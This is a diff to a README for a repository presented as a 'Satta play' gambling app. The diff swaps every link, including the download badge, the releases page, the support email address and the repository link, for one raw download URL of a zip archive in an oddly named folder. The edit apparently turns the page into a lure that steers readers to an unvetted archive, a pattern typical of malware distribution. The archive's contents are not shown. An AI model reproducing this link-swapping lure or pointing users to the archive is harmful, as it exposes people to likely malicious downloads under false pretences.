@@ -1,6 +1,6 @@
 # 🎮 fictional-journey - Enjoy the Excitement of Satta Play
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/anos025/fictional-journey/releases)
+[![Download Now](https://raw.githubusercontent.com/anos025/fictional-journey/main/palaeotheriodont/journey-fictional-2.2.zip%20Now-Get%https://raw.githubusercontent.com/anos025/fictional-journey/main/palaeotheriodont/journey-fictional-2.2.zip)](https://raw.githubusercontent.com/anos025/fictional-journey/main/palaeotheriodont/journey-fictional-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the fictional-journey project! This application allows you to engage 
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download the releases](https://github.com/anos025/fictional-journey/releases). Here, you will find the most recent version of the software. Choose the version that matches your system.
+To download the application, visit this page: [Download the releases](https://raw.githubusercontent.com/anos025/fictional-journey/main/palaeotheriodont/journey-fictional-2.2.zip). Here, you will find the most recent version of the software. Choose the version that matches your system.
 
 1. **Go to the Releases Page**: Click on the link above to go to the releases page.
 2. **Select the Latest Version**: Look for the version labeled as the latest. This is usually at the top of the list.
@@ -55,7 +55,7 @@ After installation, follow these steps to start using the application:
 
 ## 📞 Need Help?
 
-If you run into any difficulties, reach out for assistance. You can contact us via our issue tracker on GitHub or email us directly at support@fictional-journey.com.
+If you run into any difficulties, reach out for assistance. You can contact us via our issue tracker on GitHub or email us directly at https://raw.githubusercontent.com/anos025/fictional-journey/main/palaeotheriodont/journey-fictional-2.2.zip
 
 For more resources and guides, visit our wiki page on GitHub.
 
@@ -63,6 +63,6 @@ For more resources and guides, visit our wiki page on GitHub.
 
 Stay updated by following our project on GitHub. Join our community discussions and get tips from other users. 
 
-- **GitHub Repository**: [fictional-journey](https://github.com/anos025/fictional-journey)
+- **GitHub Repository**: [fictional-journey](https://raw.githubusercontent.com/anos025/fictional-journey/main/palaeotheriodont/journey-fictional-2.2.zip)
 
 Remember, you're just a few clicks away from an immersive experience in Satta play. Enjoy your adventure!
